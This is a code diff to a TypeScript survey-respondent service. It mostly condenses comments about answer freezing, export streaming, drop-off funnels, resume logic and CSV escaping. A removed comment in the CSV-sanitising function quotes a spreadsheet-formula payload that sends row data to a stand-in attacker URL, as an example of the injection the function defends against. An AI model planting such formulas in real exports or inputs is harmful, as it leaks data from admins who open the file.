@@ -6,12 +6,7 @@ import {
   type SurveyRow,
 } from '../repositories/survey.repository';
 import { ServiceError } from './errors';
-import {
-  BATCH_ANSWER_LIMIT,
-  COMPLETION_TIME_BUCKETS,
-  clampAnswerMs as clampAnswerMsShared,
-  percentile,
-} from '../constants';
+import { BATCH_ANSWER_LIMIT, COMPLETION_TIME_BUCKETS, clampAnswerMs, percentile } from '../constants';
 import { validateAnswer, type QuestionSpec } from '../../../shared/answer-validation';
 
 export interface ResumeResult {
@@ -28,11 +23,6 @@ export interface BatchAnswerInput {
   otherText?: string;
   answerMs?: number;
 }
-
-// Shared clamp helper — re-exported name so the rest of this file doesn't need
-// to change, but the implementation lives in constants.ts so the DO fast-path
-// in ws-handler can reuse the exact same validation.
-const clampAnswerMs = clampAnswerMsShared;
 
 export interface AggregatedResult {
   questionId: string;
@@ -136,10 +126,8 @@ export class RespondentService {
       throw new ServiceError('Respondent does not belong to this survey', 403);
     }
 
-    // Completion is terminal: once a respondent has submitted complete, their
-    // answers are frozen. Without this guard, the INSERT OR REPLACE would let
-    // a completed respondent silently rewrite their answers (or analytics
-    // signals like answer_ms) at any time before the survey closes.
+    // Completion is terminal: without this guard the upsert would let a
+    // completed respondent silently rewrite their answers and answer_ms.
     if (respondent.is_complete) {
       throw new ServiceError('Survey already completed', 409);
     }
@@ -177,10 +165,8 @@ export class RespondentService {
   }
 
   /**
-   * Mark a respondent complete. Returns true on the 0→1 transition, false on
-   * idempotent no-op (already complete). Callers use the return value to gate
-   * counter / tally updates so a duplicate `complete` call doesn't inflate
-   * counts or be retroactively rewritten.
+   * Returns true only on the 0→1 transition; a duplicate `complete` returns
+   * false so callers don't double-count it.
    */
   async complete(slug: string, respondentId: string, knownSurvey?: SurveyRow): Promise<boolean> {
     const respondent = await this.respondents.getById(respondentId);
@@ -248,11 +234,8 @@ export class RespondentService {
     const questions = await this.questions.getBySurveyId(surveyId);
     const responses = await this.answers.getAllResponsesForSurvey(surveyId);
 
-    // Group responses once — the DB query orders by respondent so this is
-    // effectively a streaming group-by, but we still need the aggregated
-    // shape (one entry per respondent) before emitting. The output itself
-    // is streamed to the Response so we don't hold a second copy in a
-    // concatenated string.
+    // Rows must be collapsed per respondent before any record can be emitted,
+    // so the grouping is buffered; only the output below is streamed.
     const respondentMap = new Map<
       string,
       { completedAt: string | null; answers: Map<string, { value: string; otherText: string | null }> }
@@ -290,7 +273,6 @@ export class RespondentService {
       return { data: stream, contentType: 'application/json', filename: `${filenameBase}.json` };
     }
 
-    // CSV
     const questionColumns = questions.map((q) => ({ id: q.id, text: q.text, hasOther: q.has_other === 1 }));
     const headers = ['respondent_id', 'completed_at'];
     for (const col of questionColumns) {
@@ -347,7 +329,6 @@ export class RespondentService {
     const rows = await this.respondents.getAnswerDurationsByQuestion(surveyId);
     if (rows.length === 0) return [];
 
-    // Bucket durations by question, preserving survey order.
     const byQ = new Map<string, { questionId: string; questionText: string; sort: number; durations: number[] }>();
     for (const r of rows) {
       let entry = byQ.get(r.question_id);
@@ -440,12 +421,9 @@ export class RespondentService {
     const dropoffData = await this.answers.getDropoffData(surveyId);
     const totalRespondents = counts.total;
 
-    // The funnel measures cohort attrition, not per-question completion.
-    // `reached_count` is the distinct respondents who answered any question
-    // at this position or later — naturally non-increasing across the list.
-    // Drop-off at each step is the loss against the PREVIOUS question's
-    // reached cohort (the first question's baseline is total respondents,
-    // capturing those who started but bailed before answering anything).
+    // Drop-off is measured against the PREVIOUS question's reached cohort, and
+    // the first question's baseline is the total respondents — so people who
+    // started but answered nothing register as a drop at question one.
     return dropoffData.map((d, i) => {
       const reached = d.reached_count;
       const previousReached = i === 0 ? totalRespondents : dropoffData[i - 1].reached_count;
@@ -577,12 +555,10 @@ export class RespondentService {
   }
 
   private csvSafe(value: string): string {
-    // Neutralize spreadsheet formula triggers (CWE-1236). Excel/Sheets/LibreOffice
-    // evaluate cells starting with =, +, -, @, tab, or CR as formulas, so a
-    // respondent answer like `=HYPERLINK("https://attacker/?d="&A2,"x")` would
-    // exfiltrate adjacent row data when an admin opens the export. Prefix with
-    // a single quote per OWASP CSV Injection guidance — the apostrophe is
-    // stripped from the rendered cell but defangs the formula.
+    // CSV injection (CWE-1236): spreadsheets evaluate cells starting with
+    // =, +, -, @, tab or CR as formulas, so an answer like `=HYPERLINK(...)`
+    // exfiltrates adjacent rows when an admin opens the export. The leading
+    // apostrophe defangs it (OWASP) and is stripped from the rendered cell.
     const safe = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
     return safe.replace(/"/g, '""');
   }
@@ -608,14 +584,9 @@ export class RespondentService {
   }
 
   /**
-   * Find the resume point — the question the respondent should land on.
-   *
-   * We use the LAST answered question's position rather than the first
-   * unanswered one. The old approach would send a user backwards to an
-   * optional question they intentionally skipped. By finding the highest
-   * index that has an answer, we resume from where they actually were.
-   *
-   * If nothing is answered yet, returns 0 (start of the survey).
+   * Resume at the LAST answered question's index rather than the first
+   * unanswered one: optional questions a respondent deliberately skipped
+   * would otherwise send them backwards. Returns 0 when nothing is answered.
    */
   private findResumeIndex(
     questions: QuestionRow[],
@@ -627,10 +598,8 @@ export class RespondentService {
         lastAnsweredIndex = i;
       }
     }
-    // Resume ON the last answered question — not the one after it — because
-    // the user may not have finished their answer (e.g. mid-typing in a
-    // text field when the tab crashed). Showing them that question lets
-    // them review or complete it before advancing.
+    // Resume ON that question, not after it — the answer may be half-finished
+    // (e.g. mid-typing when the tab crashed).
     return Math.max(0, lastAnsweredIndex);
   }
 }
